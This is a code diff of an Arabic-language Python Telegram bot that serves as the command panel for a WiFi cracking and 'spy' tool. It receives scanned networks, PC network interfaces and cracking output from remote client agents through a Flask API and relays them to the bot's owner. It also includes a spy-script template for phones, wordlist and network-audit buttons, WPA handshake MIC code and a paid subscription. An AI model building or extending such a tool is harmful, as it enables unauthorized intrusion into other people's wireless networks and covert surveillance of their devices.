@@ -19,8 +19,9 @@ TOKEN = os.environ.get('TOKEN')
 bot = telebot.TeleBot(TOKEN)
 user_last_message_time = {}
 
-# مخزن مؤقت لحفظ آخر شبكات حقيقية تم استقبالها من الأجهزة المتصلة
+# مخازن مؤقتة للبيانات الحية
 LATEST_SCANNED_NETWORKS = {}
+LATEST_PC_INTERFACES = []  # مخزن كروت الشبكة القادمة من الكمبيوتر
 
 # --- 2. محرك التشفير والمحاكاة الرياضية للمصافحة ---
 class WiFiHandshake:
@@ -71,7 +72,7 @@ class WiFiHandshake:
         mic = hmac.new(tk, data, hashlib.md5).digest()
         return mic[:16]
 
-# --- 3. قالب سكريبت الاستماع والارسال لجهاز العميل (القديم) ---
+# --- 3. قالب سكريبت الاستماع والارسال القديم ---
 IOS_SPY_SCRIPT_TEMPLATE = """# -*- coding: utf-8 -*-
 import time
 import requests
@@ -159,35 +160,43 @@ def callback_query(call):
         bot.send_message(call.message.chat.id, f"📏 <b>تحليل نطاق البث الحقيقي:</b>\n\nالهاتف يبعد عن نقطة بث الراوتر بمسافة هندسية تقريبية تقدر بـ <b>{distance} متر</b> بناءً على مستوى الفقد الحالي في الإشارة.")
 
     elif call.data == 'wifi_spy_init':
-        if not LATEST_SCANNED_NETWORKS:
-            target_name = "LOWER"
-            for line in IOS_SPY_SCRIPT_TEMPLATE.split("\n"):
-                if "TARGET_SSID =" in line:
-                    try: target_name = line.split('"')[1]
-                    except: pass
-            networks_to_show = [{"ssid": target_name, "bssid": "00:14:22:01:23:45", "rssi": -48}]
-        else:
-            networks_to_show = list(LATEST_SCANNED_NETWORKS.values())
-
-        for net in networks_to_show:
-            ssid = net.get('ssid', 'Unknown')
-            bssid = net.get('bssid', '00:00:00:00:00:00')
-            rssi = net.get('rssi', -100)
-            try: distance = round(10 ** ((-30 - rssi) / (10 * 2.5)), 1)
-            except: distance = "غير محدد"
-
-            markup = types.InlineKeyboardMarkup(row_width=2)
-            markup.add(
-                types.InlineKeyboardButton("🔍 Audit Network", callback_data=f"audit_{bssid}_{ssid}"),
-                types.InlineKeyboardButton("📝 Wordlist", callback_data=f"wordlist_{ssid}"),
-                types.InlineKeyboardButton("📍 Distance", callback_data=f"dist_{distance}")
-            )
-            report = (f"🌐 **SSID:** `{ssid}`\n"
-                      f"🆔 **BSSID:** `{bssid}`\n"
-                      f"📶 **RSSI:** `{rssi} dBm`\n"
-                      f"📏 **Est. Distance:** `{distance} m`\n"
+        # [تعديل اللوحة]: إذا استقبلنا كروت شبكة من الكمبيوتر، نعرضها بدلاً من LOWER
+        if LATEST_PC_INTERFACES:
+            interfaces_str = ", ".join(LATEST_PC_INTERFACES)
+            markup = types.InlineKeyboardMarkup(row_width=1)
+            markup.add(types.InlineKeyboardButton("🔄 فحص عتاد جديد", callback_data="wifi_spy_init"))
+            
+            report = (f"🖥️ <b>لوحة تحكم كروت شبكة الكمبيوتر الحية:</b>\n\n"
+                      f"🔌 <b>العتاد النشط المكتشف:</b> <code>{interfaces_str}</code>\n"
+                      f"สถานะ: 🟢 متصل وجاهز للاستقبال الحيوى.\n"
                       f"----------------------------------")
-            bot.send_message(OWNER_ID, report, parse_mode="Markdown", reply_markup=markup)
+            bot.send_message(OWNER_ID, report, parse_mode="HTML", reply_markup=markup)
+        else:
+            # حالة عدم وجود بيانات كمبيوتر، نعرض مصفوفة الهاتف الافتراضية
+            if not LATEST_SCANNED_NETWORKS:
+                networks_to_show = [{"ssid": "LOWER", "bssid": "00:14:22:01:23:45", "rssi": -48}]
+            else:
+                networks_to_show = list(LATEST_SCANNED_NETWORKS.values())
+
+            for net in networks_to_show:
+                ssid = net.get('ssid', 'Unknown')
+                bssid = net.get('bssid', '00:00:00:00:00:00')
+                rssi = net.get('rssi', -100)
+                try: distance = round(10 ** ((-30 - rssi) / (10 * 2.5)), 1)
+                except: distance = "غير محدد"
+
+                markup = types.InlineKeyboardMarkup(row_width=2)
+                markup.add(
+                    types.InlineKeyboardButton("🔍 Audit Network", callback_data=f"audit_{bssid}_{ssid}"),
+                    types.InlineKeyboardButton("📝 Wordlist", callback_data=f"wordlist_{ssid}"),
+                    types.InlineKeyboardButton("📍 Distance", callback_data=f"dist_{distance}")
+                )
+                report = (f"🌐 **SSID:** `{ssid}`\n"
+                          f"🆔 **BSSID:** `{bssid}`\n"
+                          f"📶 **RSSI:** `{rssi} dBm`\n"
+                          f"📏 **Est. Distance:** `{distance} m`\n"
+                          f"----------------------------------")
+                bot.send_message(OWNER_ID, report, parse_mode="Markdown", reply_markup=markup)
 
     elif call.data.startswith('audit_'):
         parts = call.data.split('_')
@@ -288,7 +297,7 @@ def callback_query(call):
         prices = [types.LabeledPrice(label="اشتراك ماكس برو", amount=100)]
         bot.send_invoice(chat_id=call.message.chat.id, title="اشتراك ماكس المتقدم ✨", description="تفعيل جميع الخدمات المدفوعة داخل البوت لمدة شهر.", invoice_payload="max_premium_subscription", provider_token="", currency="XTR", prices=prices)
 
-# --- 8. أنظمة الفواتير وبوابات الربط واستقبال التحديثات من الأجهزة الحية ---
+# --- 8. استقبال التحديثات البرمجية من الأجهزة الحية عبر الـ API ---
 @bot.pre_checkout_query_handler(func=lambda query: True)
 def process_pre_checkout(pre_checkout_query):
     bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
@@ -304,21 +313,26 @@ def home(): return "البوت مستقر ويعمل بنظام الحسابات
 
 @app.route('/api/wifi_update', methods=['POST'])
 def wifi_update():
-    global LATEST_SCANNED_NETWORKS
+    global LATEST_SCANNED_NETWORKS, LATEST_PC_INTERFACES
     data = request.json
     if not data:
         return jsonify({"status": "failed", "message": "بيانات غير صالحة"}), 400
 
-    # 1. معالجة البيانات القادمة من العميل الرسومي الجديد (wifi_monitor.py)
+    # 1. معالجة البيانات القادمة من الواجهة للكمبيوتر (wifi_monitor.py)
     if 'agent_event' in data:
         event_type = data.get("agent_event")
         payload = data.get("data_payload")
 
         if event_type == "interfaces_discovered":
-            bot.send_message(OWNER_ID, f"🖥️ <b>[تحديث واجهة العميل للكمبيوتر]:</b>\n\n🔄 تم رصد عتاد شبكة جديد متصل محلياً بالعميل:\n<code>{payload}</code>", parse_mode="HTML")
+            # حفظ كروت الشبكة في الذاكرة لتحديث لوحة التحكم تلقائياً
+            if isinstance(payload, list):
+                LATEST_PC_INTERFACES = payload
+            else:
+                LATEST_PC_INTERFACES = [str(payload)]
+                
+            bot.send_message(OWNER_ID, f"🖥️ <b>[تحديث العميل]:</b> تم استقبال كروت العتاد بنجاح وتحديث لوحة التحكم الرقمية بنجاح ✅", parse_mode="HTML")
         
         elif event_type == "cracking_result":
-            # إرسال مخرجات الكسر النصية كاملة للمالك
             bot.send_message(OWNER_ID, f"⚡ <b>[تقرير مخرجات العميل المباشر]:</b>\n\nوصل تحديث فوري لنتائج الفحص والكسر:\n\n<pre>{payload[:3500]}</pre>", parse_mode="HTML")
             
         elif event_type == "file_attached":
@@ -327,7 +341,7 @@ def wifi_update():
 
         return jsonify({"status": "success", "message": "تمت معالجة حدث العميل"}), 200
 
-    # 2. معالجة البيانات القادمة من قالب الآيفون والتطبيقات القديمة (للخلفية والتوافق المتكامل)
+    # 2. معالجة البيانات القادمة من مصفوفة الهاتف القديمة
     if 'networks' in data:
         networks_list = data['networks']
         LATEST_SCANNED_NETWORKS.clear()
